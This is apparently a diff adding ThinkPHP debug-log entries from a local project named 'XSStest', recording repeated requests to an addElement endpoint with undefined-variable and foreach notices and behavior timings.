+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 45 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000066s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000157s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.020045s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020122s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001637s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001712s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004157s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004248s ]
+
+[ 2016-05-03T12:05:59+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003898s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004845s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004991s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 42 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 43 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000092s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000180s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.021129s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021206s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001688s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001761s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001985s ]
+INFO: [ app_end ] --END-- [ RunTime:0.002077s ]
+
+[ 2016-05-03T12:06:06+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000337s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000451s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000495s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 42 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 43 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000076s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000169s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.014762s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.014857s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000216s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000265s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000804s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000874s ]
+
+[ 2016-05-03T12:50:48+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003930s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004248s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004365s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 42 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 43 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000092s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000180s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.021912s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.022031s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001908s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001988s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004228s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004319s ]
+
+[ 2016-05-03T12:50:51+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000766s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000332s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000373s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 42 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 43 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000046s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000116s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005295s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.005334s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000186s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000228s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000331s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000360s ]
+
+[ 2016-05-03T12:51:13+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003662s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003993s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004239s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000063s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000165s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.020558s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020637s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001807s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001879s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001978s ]
+INFO: [ app_end ] --END-- [ RunTime:0.002076s ]
+
+[ 2016-05-03T12:52:31+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.004226s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003868s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003987s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000063s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000163s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.020303s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020379s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001694s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001765s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004164s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004254s ]
+
+[ 2016-05-03T12:54:20+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.004006s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003959s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004077s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000090s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000192s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.022027s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.022110s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.003531s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003612s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004221s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004314s ]
+
+[ 2016-05-03T12:54:22+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000253s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000643s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000736s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000049s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000128s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.015357s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.015405s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000205s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000249s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000581s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000632s ]
+
+[ 2016-05-03T12:54:30+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000542s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000715s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000848s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000084s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000206s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004854s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004899s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000112s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000135s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000433s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000468s ]
+
+[ 2016-05-03T12:54:31+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000256s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000285s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000024s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000059s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003714s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003746s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000138s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000164s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000554s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000600s ]
+
+[ 2016-05-03T12:54:33+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000656s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000601s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000677s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000030s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000076s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.012632s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.012673s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000116s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000142s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000309s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000335s ]
+
+[ 2016-05-03T12:54:33+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000256s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000287s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000023s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000059s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003604s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003650s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000184s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000232s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000464s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000502s ]
+
+[ 2016-05-03T12:54:33+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000263s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000292s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000025s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000064s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003499s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003526s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000102s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000126s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000293s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000318s ]
+
+[ 2016-05-03T12:54:33+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000285s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000316s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000039s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000116s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004716s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004743s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000115s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000141s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000307s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000334s ]
+
+[ 2016-05-03T12:54:34+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000204s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000431s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000470s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000029s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000090s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004264s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004313s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000106s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000130s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000298s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000323s ]
+
+[ 2016-05-03T12:58:32+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003899s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004147s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 43 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000063s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000152s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.021267s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021344s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001626s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001699s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004125s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004215s ]
+
+[ 2016-05-03T12:58:38+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000308s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000407s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000448s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 43 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000064s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000190s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005643s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.005691s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000350s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000414s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000741s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000813s ]
+
+[ 2016-05-03T12:59:16+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000454s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000498s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000042s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000096s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004579s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004633s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000138s ]
